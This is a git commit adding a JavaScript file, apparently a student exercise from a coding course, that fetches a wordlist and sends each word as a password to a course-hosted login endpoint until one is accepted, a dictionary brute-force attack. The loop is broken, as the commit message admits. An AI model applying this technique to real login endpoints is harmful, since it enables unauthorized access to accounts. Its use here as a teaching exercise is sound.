744a4a961077447bfbc8c5c8fe5d432ba16d7e1d
Juliette3529 <Juliette@saint-jalme.fr>
2016-08-01 14:11:26 +0200

    le while ne marche qu'une fois

---
+++ js/script.js
@@ -0,0 +1,63 @@
+var dico;
+var tabdico;
+var rep;
+
+function cool() {
+    $.ajax({
+        url: 'http://docusland.fr/code-academie/js_bruteforce/data/dico.txt', // l'url
+        type: 'GET',
+        dataType: 'text', // ce qu'on veut 
+        success: function (result) {
+            dico = result;
+            tabdico = dico.split("\n");
+        }
+
+    });
+
+};
+
+function test() {
+    var i = 0;
+    var url = "http://docusland.fr/code-academie/js_bruteforce/index.php?password=";
+    
+   /* var password = "%22" + tabdico[i] + "%22";
+        $.ajax({
+            url: url + password, // l'url
+            type: 'POST',
+            dataType: 'text', // ce qu'on veut
+            success: function (result) {
+                rep = result;
+                console.log(rep);
+            }
+        }).always(function(result, status, error){
+            console.log("result");
+            console.log(result);
+            console.log("status");
+            console.log(status);
+            console.log("error");
+            console.log(error);
+        })
+*/
+    do {
+        tabdico[i];
+        i++;
+        var password = "%22" + tabdico[i] + "%22";
+        $.ajax({
+            url: url + password, // l'url
+            type: 'POST',
+            dataType: 'text', // ce qu'on veut
+            success: function (result) {
+                rep = result;
+                console.log(rep);
+            }
+        }).always(function(result, status, error){
+            console.log(result);
+            console.log(status);
+        })
+    } while ( rep.match("Erroneous password") == "Erroneous password" )
+    
+    alert("le mdp est:" + tabdico[i]);
+}
+            
+            //http://docusland.fr/code-academie/js_bruteforce/index.php?password=
+
